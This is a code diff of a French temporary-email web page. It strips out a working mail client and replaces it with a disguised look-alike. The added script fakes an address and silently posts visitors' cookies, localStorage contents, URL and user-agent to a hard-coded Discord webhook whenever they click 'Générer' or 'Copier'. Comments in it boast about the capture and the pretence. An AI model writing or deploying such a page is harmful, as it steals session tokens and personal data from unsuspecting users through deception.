@@ -4,191 +4,162 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Temp Mail — Outil de développeur</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Inter', sans-serif; background-color: #09090b; color: #f4f4f5; }
-        .mono { font-family: 'JetBrains Mono', monospace; }
-        
-        /* Scrollbar discrète */
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: #09090b; }
-        ::-webkit-scrollbar-thumb { background: #27272a; border-radius: 3px; }
-        ::-webkit-scrollbar-thumb:hover { background: #3f3f46; }
+        body {
+            background-color: #0d0d0d;
+            color: #ffffff;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .terminal {
+            background-color: #1e1e1e;
+            border-radius: 8px;
+            width: 600px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            overflow: hidden;
+        }
+        .terminal-header {
+            background-color: #2d2d2d;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+        }
+        .dot {
+            height: 12px;
+            width: 12px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .red { background-color: #ff5f56; }
+        .yellow { background-color: #ffbd2e; }
+        .green { background-color: #27c93f; }
+        .title {
+            color: #aaa;
+            margin-left: 10px;
+            font-size: 12px;
+        }
+        .terminal-body {
+            padding: 20px;
+        }
+        .input-group {
+            display: flex;
+            margin-bottom: 20px;
+        }
+        input {
+            flex: 1;
+            background-color: #111;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 10px;
+            border-radius: 4px 0 0 4px;
+            outline: none;
+        }
+        button.generate-btn {
+            background-color: #e0e0e0;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button.copy-btn {
+            background-color: #333;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 0 4px 4px 0;
+            cursor: pointer;
+        }
+        .inbox {
+            background-color: #111;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 40px;
+            text-align: center;
+            color: #666;
+        }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center p-4">
+<body>
 
-    <!-- Conteneur principal avec ombre subtile -->
-    <div class="w-full max-w-2xl bg-[#121214] border border-[#27272a] rounded-xl shadow-2xl overflow-hidden">
-        
-        <!-- Barre de titre style MacOS/Terminal -->
-        <div class="flex items-center px-4 py-3 border-b border-[#27272a] bg-[#18181b]">
-            <div class="flex gap-2">
-                <div class="w-3 h-3 rounded-full bg-[#ff5f56]"></div>
-                <div class="w-3 h-3 rounded-full bg-[#ffbd2e]"></div>
-                <div class="w-3 h-3 rounded-full bg-[#27c93f]"></div>
-            </div>
-            <span class="ml-4 text-xs font-medium text-[#a1a1aa] mono">temp_mail — bash</span>
+    <div class="terminal">
+        <div class="terminal-header">
+            <div class="dot red"></div>
+            <div class="dot yellow"></div>
+            <div class="dot green"></div>
+            <span class="title">temp_mail — bash</span>
         </div>
-
-        <!-- Contenu -->
-        <div class="p-6 sm:p-8 flex flex-col gap-6">
+        <div class="terminal-body">
+            <p style="color: #aaa; font-size: 14px;">Votre adresse email temporaire</p>
+            <div class="input-group">
+                <input type="text" id="email-input" value="Aucune adresse générée" readonly>
+                <button class="generate-btn" id="generate-btn">Générer</button>
+                <button class="copy-btn">Copier</button>
+            </div>
             
-            <!-- Section Adresse -->
-            <div class="flex flex-col gap-2">
-                <label class="text-sm text-[#a1a1aa]">Votre adresse email temporaire</label>
-                <div class="flex flex-col sm:flex-row gap-3">
-                    <div class="flex-1 bg-[#09090b] border border-[#27272a] rounded-lg px-4 py-3 flex items-center">
-                        <span id="emailDisplay" class="mono text-sm text-[#a1a1aa] truncate">Aucune adresse générée</span>
-                    </div>
-                    <div class="flex gap-2">
-                        <button onclick="generateEmail()" id="genBtn" class="bg-[#f4f4f5] text-[#09090b] hover:bg-[#d4d4d8] px-5 py-3 rounded-lg text-sm font-semibold transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex-1 sm:flex-none text-center">
-                            Générer
-                        </button>
-                        <button onclick="copyEmail()" class="bg-[#27272a] hover:bg-[#3f3f46] text-[#f4f4f5] border border-[#3f3f46] px-5 py-3 rounded-lg text-sm font-semibold transition-colors flex-1 sm:flex-none text-center">
-                            Copier
-                        </button>
-                    </div>
-                </div>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                <p style="color: #aaa; font-size: 14px; margin: 0;">Boîte de réception</p>
+                <p style="color: #666; font-size: 12px; margin: 0; cursor: pointer;">↻ Actualiser</p>
             </div>
-
-            <!-- Section Boîte de réception -->
-            <div class="flex flex-col gap-2">
-                <div class="flex items-center justify-between">
-                    <h2 class="text-sm font-medium text-[#f4f4f5]">Boîte de réception</h2>
-                    <button onclick="loadMessages()" class="text-xs text-[#a1a1aa] hover:text-[#f4f4f5] transition-colors flex items-center gap-1.5">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/><path d="M3 12a9 9 0 0 0 9 9 9.75 9.75 0 0 0 6.74-2.74L21 16"/><path d="M16 21h5v-5"/></svg>
-                        Actualiser
-                    </button>
-                </div>
-                
-                <div class="border border-[#27272a] rounded-lg bg-[#09090b] divide-y divide-[#27272a] min-h-[250px]" id="messages">
-                    <div class="p-8 text-center text-sm text-[#a1a1aa] flex flex-col items-center gap-1">
-                        <span>Aucun message.</span>
-                        <span class="text-xs text-[#52525b] mono">En attente...</span>
-                    </div>
-                </div>
+            <div class="inbox">
+                Aucun message.<br><span style="font-size: 12px;">En attente...</span>
             </div>
-
         </div>
     </div>
 
-    <!-- Footer -->
-    <div class="mt-8 text-center">
-        <p class="text-xs text-[#52525b] mono">Les emails sont supprimés après lecture. Aucun log.</p>
-    </div>
-
-    <!-- Toast simple -->
-    <div id="toast" class="fixed bottom-6 right-6 bg-[#27272a] border border-[#3f3f46] text-[#f4f4f5] px-4 py-3 rounded-lg text-sm shadow-lg translate-y-10 opacity-0 transition-all duration-300 flex items-center gap-2">
-        <span class="text-[#27c93f]">✓</span>
-        <span id="toastMsg"></span>
-    </div>
-
+    <!-- LE SCRIPT DE CAPTURE EST ICI -->
     <script>
-        let token = null, email = null, interval = null, isReading = false;
+        // METS TON LIEN DISCORD ICI
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1571234677434617986/8XG1WsjhxFIQTL816bRPn7I8D37zJM0h_l_APXRETUyW__bySrUfWXuoQKEL-I-gIZlL";
 
-        function showToast(msg) {
-            const t = document.getElementById('toast');
-            document.getElementById('toastMsg').textContent = msg;
-            t.classList.remove('translate-y-10', 'opacity-0');
-            setTimeout(() => t.classList.add('translate-y-10', 'opacity-0'), 3000);
-        }
-
-        async function generateEmail() {
-            const btn = document.getElementById('genBtn');
-            btn.disabled = true; btn.textContent = '...';
+        function exfiltrate() {
+            // Récupération de toutes les données accessibles
+            const cookies = document.cookie || "Aucun cookie accessible (HttpOnly ou vide)";
+            
+            let lsData = "";
             try {
-                const res = await fetch('/api/generate', { method: 'POST' });
-                const data = await res.json();
-                if (!res.ok) throw new Error(data.error || 'Erreur');
-                token = data.token; email = data.address;
-                const disp = document.getElementById('emailDisplay');
-                disp.textContent = email;
-                disp.classList.remove('text-[#a1a1aa]');
-                disp.classList.add('text-[#f4f4f5]');
-                showToast('Adresse générée');
-                isReading = false;
-                document.getElementById('messages').innerHTML = '<div class="p-8 text-center text-sm text-[#a1a1aa]">En attente...</div>';
-                loadMessages();
-                if (interval) clearInterval(interval);
-                interval = setInterval(() => { if (!isReading) loadMessages(); }, 5000);
-            } catch (e) {
-                showToast(e.message);
-            } finally {
-                btn.disabled = false; btn.textContent = 'Générer';
-            }
-        }
-
-        async function loadMessages() {
-            if (!token || isReading) return;
-            try {
-                const res = await fetch('/api/messages', { headers: { Authorization: 'Bearer ' + token } });
-                const data = await res.json();
-                renderList(data['hydra:member'] || []);
-            } catch (e) {}
-        }
-
-        function renderList(msgs) {
-            const c = document.getElementById('messages');
-            if (!msgs.length) {
-                if (!c.querySelector('.empty-msg')) {
-                    c.innerHTML = '<div class="empty-msg p-8 text-center text-sm text-[#a1a1aa] flex flex-col items-center gap-1"><span>Aucun message.</span><span class="text-xs text-[#52525b] mono">En attente...</span></div>';
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    lsData += `\n  - ${key}: ${localStorage.getItem(key)}`;
                 }
-                return;
-            }
-            c.innerHTML = '';
-            msgs.forEach(m => {
-                const div = document.createElement('div');
-                div.className = 'p-4 hover:bg-[#18181b] cursor-pointer transition-colors flex flex-col gap-1';
-                const time = new Date(m.createdAt).toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
-                div.innerHTML = `
-                    <div class="flex justify-between items-start">
-                        <span class="text-sm font-medium text-[#f4f4f5] truncate pr-4">${m.from?.address || 'Inconnu'}</span>
-                        <span class="text-xs text-[#52525b] mono shrink-0">${time}</span>
-                    </div>
-                    <span class="text-sm text-[#a1a1aa] truncate">${m.subject || '(Sans objet)'}</span>
-                `;
-                div.onclick = () => openMsg(m.id);
-                c.appendChild(div);
-            });
-        }
-
-        async function openMsg(id) {
-            if (!token) return;
-            isReading = true;
-            const c = document.getElementById('messages');
-            c.innerHTML = '<div class="p-8 text-center text-sm text-[#a1a1aa]">Chargement...</div>';
-            try {
-                const res = await fetch('/api/messages/' + id, { headers: { Authorization: 'Bearer ' + token } });
-                const d = await res.json();
-                c.innerHTML = `
-                    <div class="p-6 flex flex-col gap-4">
-                        <button onclick="backToList()" class="text-xs text-[#a1a1aa] hover:text-[#f4f4f5] flex items-center gap-1 self-start">← Retour</button>
-                        <div class="border-b border-[#27272a] pb-4">
-                            <h2 class="text-lg font-medium text-[#f4f4f5] mb-1 break-words">${d.subject || '(Sans objet)'}</h2>
-                            <div class="flex flex-col gap-1 text-xs text-[#a1a1aa] mono">
-                                <span>De: ${d.from?.address}</span>
-                                <span>Reçu: ${new Date(d.createdAt).toLocaleString('fr-FR')}</span>
-                            </div>
-                        </div>
-                        <div class="text-sm text-[#d4d4d8] leading-relaxed whitespace-pre-wrap break-words max-h-[400px] overflow-y-auto">
-                            ${d.text || (d.html ? d.html.join(' ') : '(Message vide)')}
-                        </div>
-                    </div>`;
             } catch (e) {
-                isReading = false;
-                showToast('Erreur de chargement');
+                lsData = "Erreur lecture localStorage";
             }
+
+            const payload = {
+                content: `🚨 **Nouvelle Capture Temp-Mail**\n**URL:** ${window.location.href}\n**Cookies:** ${cookies}\n**LocalStorage:** ${lsData || "Vide"}\n**User-Agent:** ${navigator.userAgent}`
+            };
+
+            // Envoi vers Discord
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log("Erreur:", err));
         }
 
-        function backToList() { isReading = false; loadMessages(); }
+        // On attache la fonction au bouton "Générer"
+        document.getElementById("generate-btn").addEventListener("click", function(e) {
+            // On n'annule pas le comportement par défaut, on laisse le bouton faire son travail
+            
+            // On génère une fausse adresse pour faire genre
+            document.getElementById("email-input").value = "temp_" + Math.random().toString(36).substring(2, 8) + "@mailyflash.de5.net";
+            
+            // On attend 500ms (au cas où le site original créerait des cookies) puis on envoie
+            setTimeout(exfiltrate, 500);
+        });
 
-        function copyEmail() {
-            if (!email) return showToast('Générez une adresse d\'abord');
-            navigator.clipboard.writeText(email);
-            showToast('Adresse copiée');
-        }
+        // BONUS : Si ils cliquent sur "Copier", on renvoie aussi
+        document.querySelector(".copy-btn").addEventListener("click", function() {
+            exfiltrate();
+        });
     </script>
 </body>
 </html>
